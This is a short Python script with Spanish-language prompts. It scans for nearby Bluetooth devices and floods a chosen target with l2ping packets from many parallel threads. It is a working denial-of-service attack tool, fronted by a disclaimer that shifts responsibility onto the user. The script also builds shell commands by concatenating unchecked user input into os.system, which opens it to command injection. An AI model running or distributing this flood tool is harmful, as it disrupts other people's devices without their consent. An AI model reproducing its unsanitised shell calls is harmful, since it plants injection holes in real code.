import os
import threading
import time
import subprocess

def bluetooth_ping(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def print_logo():
    print('Bluetooth Ping Script')

def main():
    print_logo()
    time.sleep(0.1)
    print('')
    print('ESTE SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. EL USO ES RESPONSABILIDAD COMPLETA DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD Y NO SON RESPONSABLES DE NINGÚN MAL USO O DAÑO CAUSADO POR ESTE PROGRAMA.')
    if (input("¿Estás de acuerdo? (s/n) > ") in ['s', 'S']):
        time.sleep(0.1)
        os.system('clear')
        print_logo()
        print('')
        print("Escaneando ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        id = 0
        del lines[0]
        array = []
        print("|id   |   mac_addres  |   device_name|")
        for line in lines:
            info = line.split()
            mac = info[0]
            array.append(mac)
            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
            id = id + 1
        target_id = input('ID o MAC del objetivo > ')
        try:
            target_addr = array[int(target_id)]
        except:
            target_addr = target_id

        if len(target_addr) < 1:
            print('[!] ERROR: Falta la dirección del objetivo')
            exit(0)

        try:
            packages_size = int(input('Tamaño de los paquetes > '))
        except:
            print('[!] ERROR: El tamaño de los paquetes debe ser un número entero')
            exit(0)
        try:
            threads_count = int(input('Número de hilos > '))
        except:
            print('[!] ERROR: El número de hilos debe ser un número entero')
            exit(0)
        print('')
        os.system('clear')

        print("Iniciando el ping en 3 segundos...")

        for i in range(0, 3):
            print(str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('Construyendo hilos...\n')

        for i in range(0, threads_count):
            print('Construido hilo №' + str(i + 1))
            threading.Thread(target=bluetooth_ping, args=[str(target_addr), str(packages_size)]).start()

        print('Todos los hilos construidos...')
        print('Iniciando...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Abortado')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
